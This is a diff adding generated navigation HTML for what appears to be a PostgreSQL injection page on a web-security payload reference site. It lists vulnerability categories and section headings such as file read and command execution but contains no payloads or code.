+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OracleSQL%20Injection/" class="md-nav__link">
+        Oracle SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          PostgreSQL injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        PostgreSQL injection
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-comments" class="md-nav__link">
+    PostgreSQL Comments
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-chain-injection-points-symbols" class="md-nav__link">
+    PostgreSQL chain injection points symbols
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-version" class="md-nav__link">
+    PostgreSQL Version
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-current-user" class="md-nav__link">
+    PostgreSQL Current User
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-users" class="md-nav__link">
+    PostgreSQL List Users
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-password-hashes" class="md-nav__link">
+    PostgreSQL List Password Hashes
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-database-administrator-accounts" class="md-nav__link">
+    PostgreSQL List Database Administrator Accounts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-privileges" class="md-nav__link">
+    PostgreSQL List Privileges
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-check-if-current-user-is-superuser" class="md-nav__link">
+    PostgreSQL Check if Current User is Superuser
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-database-name" class="md-nav__link">
+    PostgreSQL Database Name
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-database" class="md-nav__link">
+    PostgreSQL List Database
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-tables" class="md-nav__link">
+    PostgreSQL List Tables
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-columns" class="md-nav__link">
+    PostgreSQL List Columns
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-error-based" class="md-nav__link">
+    PostgreSQL Error Based
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-xml-helpers" class="md-nav__link">
+    PostgreSQL XML helpers
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-blind" class="md-nav__link">
+    PostgreSQL Blind
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-time-based" class="md-nav__link">
+    PostgreSQL Time Based
+  </a>
+  
+    <nav class="md-nav" aria-label="PostgreSQL Time Based">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#identify-time-based" class="md-nav__link">
+    Identify time based
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#database-dump-time-based" class="md-nav__link">
+    Database dump time based
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#table-dump-time-based" class="md-nav__link">
+    Table dump time based
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#columns-dump-time-based" class="md-nav__link">
+    columns dump time based
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-stacked-query" class="md-nav__link">
+    PostgreSQL Stacked Query
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-file-read" class="md-nav__link">
+    PostgreSQL File Read
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-file-write" class="md-nav__link">
+    PostgreSQL File Write
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-command-execution" class="md-nav__link">
+    PostgreSQL Command execution
+  </a>
+  
+    <nav class="md-nav" aria-label="PostgreSQL Command execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-20199193" class="md-nav__link">
+    CVE-2019–9193
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-libcso6" class="md-nav__link">
+    Using libc.so.6
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-filter" class="md-nav__link">
+    Bypass Filter
+  </a>
+  
+    <nav class="md-nav" aria-label="Bypass Filter">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#quotes" class="md-nav__link">
+    Quotes
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQLite%20Injection/" class="md-nav__link">
+        SQLite Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_43" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_43" id="__nav_43_label" tabindex="0">
+          Server Side Include Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_43_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_43">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Include Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Include%20Injection/" class="md-nav__link">
+        Server Side Include Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_44" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_44" id="__nav_44_label" tabindex="0">
+          Server Side Request Forgery
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_44_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_44">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Request Forgery
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Request%20Forgery/" class="md-nav__link">
+        Server-Side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_45" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_45" id="__nav_45_label" tabindex="0">
+          Server Side Template Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_45_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_45">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Template Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Template%20Injection/" class="md-nav__link">
+        Server Side Template Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_46" id="__nav_46_label" tabindex="0">
+          Tabnabbing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_46_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_46">
+          <span class="md-nav__icon md-icon"></span>
+          Tabnabbing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tabnabbing/" class="md-nav__link">
+        Tabnabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_47" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_47" id="__nav_47_label" tabindex="0">
+          Type Juggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_47_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_47">
+          <span class="md-nav__icon md-icon"></span>
+          Type Juggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Type%20Juggling/" class="md-nav__link">
+        Type Juggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48" id="__nav_48_label" tabindex="0">
+          Upload Insecure Files
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_48_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48">
+          <span class="md-nav__icon md-icon"></span>
+          Upload Insecure Files
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/" class="md-nav__link">
+        Upload Insecure Files
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_2" id="__nav_48_2_label" tabindex="0">
+          CVE Ffmpeg HLS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_2_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_2">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Ffmpeg HLS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
+        FFmpeg HLS vulnerability
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_3" id="__nav_48_3_label" tabindex="0">
+          Configuration Apache .htaccess
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_3">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Apache .htaccess
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
+        .htaccess upload
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_4" id="__nav_48_4_label" tabindex="0">
+          Configuration Busybox httpd.conf
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_4">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Busybox httpd.conf
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_5" id="__nav_48_5_label" tabindex="0">
+          Configuration uwsgi.ini
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_5">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration uwsgi.ini
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20uwsgi.ini/" class="md-nav__link">
+        uWSGI configuration file
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_6" id="__nav_48_6_label" tabindex="0">
+          Extension Flash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_6">
+          <span class="md-nav__icon md-icon"></span>
+          Extension Flash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_7" id="__nav_48_7_label" tabindex="0">
+          Picture ImageMagick
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_7">
+          <span class="md-nav__icon md-icon"></span>
+          Picture ImageMagick
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Picture%20ImageMagick/" class="md-nav__link">
+        ImageMagick Exploits
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48_8" id="__nav_48_8_label" tabindex="0">
+          Zip Slip
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_48_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_48_8">
+          <span class="md-nav__icon md-icon"></span>
+          Zip Slip
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
+        Zip Slip
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_49" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_49" id="__nav_49_label" tabindex="0">
+          Web Cache Deception
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_49_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_49">
+          <span class="md-nav__icon md-icon"></span>
+          Web Cache Deception
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Cache%20Deception/" class="md-nav__link">
+        Web Cache Deception
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_50" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_50" id="__nav_50_label" tabindex="0">
+          Web Sockets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_50_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_50">
+          <span class="md-nav__icon md-icon"></span>
+          Web Sockets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Sockets/" class="md-nav__link">
+        Web Sockets
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_51" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_51" id="__nav_51_label" tabindex="0">
+          XPATH Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_51_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_51">
+          <span class="md-nav__icon md-icon"></span>
+          XPATH Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XPATH%20Injection/" class="md-nav__link">
+        XPATH Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_52" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_52" id="__nav_52_label" tabindex="0">
+          XSLT Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_52_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_52">
+          <span class="md-nav__icon md-icon"></span>
+          XSLT Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSLT%20Injection/" class="md-nav__link">
+        XSLT Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_53" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_53" id="__nav_53_label" tabindex="0">
+          XSS Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_53_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_53">
+          <span class="md-nav__icon md-icon"></span>
+          XSS Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/" class="md-nav__link">
+        Cross Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
+        XSS in Angular and AngularJS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
+        XSS with Relative Path Overwrite - IE 8/9 and lower
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_54" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_54" id="__nav_54_label" tabindex="0">
+          XXE Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_54_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_54">
+          <span class="md-nav__icon md-icon"></span>
+          XXE Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XXE%20Injection/" class="md-nav__link">
+        XML External Entity
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_55" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_55" id="__nav_55_label" tabindex="0">
+           LEARNING AND SOCIALS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_55_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_55">
+          <span class="md-nav__icon md-icon"></span>
+           LEARNING AND SOCIALS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../_LEARNING_AND_SOCIALS/BOOKS/" class="md-nav__link">
+        Books
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../_LEARNING_AND_SOCIALS/TWITTER/" class="md-nav__link">
+        Twitter
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../_LEARNING_AND_SOCIALS/YOUTUBE/" class="md-nav__link">
+        Youtube
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_56" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_56" id="__nav_56_label" tabindex="0">
+           template vuln
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_56_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_56">
+          <span class="md-nav__icon md-icon"></span>
+           template vuln
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../_template_vuln/" class="md-nav__link">
+        Vulnerability Title
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-comments" class="md-nav__link">
+    PostgreSQL Comments
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-chain-injection-points-symbols" class="md-nav__link">
+    PostgreSQL chain injection points symbols
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-version" class="md-nav__link">
+    PostgreSQL Version
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-current-user" class="md-nav__link">
+    PostgreSQL Current User
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-users" class="md-nav__link">
+    PostgreSQL List Users
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-password-hashes" class="md-nav__link">
+    PostgreSQL List Password Hashes
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-database-administrator-accounts" class="md-nav__link">
+    PostgreSQL List Database Administrator Accounts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-privileges" class="md-nav__link">
+    PostgreSQL List Privileges
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-check-if-current-user-is-superuser" class="md-nav__link">
+    PostgreSQL Check if Current User is Superuser
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-database-name" class="md-nav__link">
+    PostgreSQL Database Name
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-database" class="md-nav__link">
+    PostgreSQL List Database
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-tables" class="md-nav__link">
+    PostgreSQL List Tables
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-list-columns" class="md-nav__link">
+    PostgreSQL List Columns
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-error-based" class="md-nav__link">
+    PostgreSQL Error Based
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-xml-helpers" class="md-nav__link">
+    PostgreSQL XML helpers
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-blind" class="md-nav__link">
+    PostgreSQL Blind
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-time-based" class="md-nav__link">
+    PostgreSQL Time Based
+  </a>
+  
+    <nav class="md-nav" aria-label="PostgreSQL Time Based">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#identify-time-based" class="md-nav__link">
+    Identify time based
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#database-dump-time-based" class="md-nav__link">
+    Database dump time based
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#table-dump-time-based" class="md-nav__link">
+    Table dump time based
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#columns-dump-time-based" class="md-nav__link">
+    columns dump time based
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-stacked-query" class="md-nav__link">
+    PostgreSQL Stacked Query
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-file-read" class="md-nav__link">
+    PostgreSQL File Read
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql-file-write" class="md-nav__link">
+    PostgreSQL File Write
+  </a>
+  
+</li>
+      
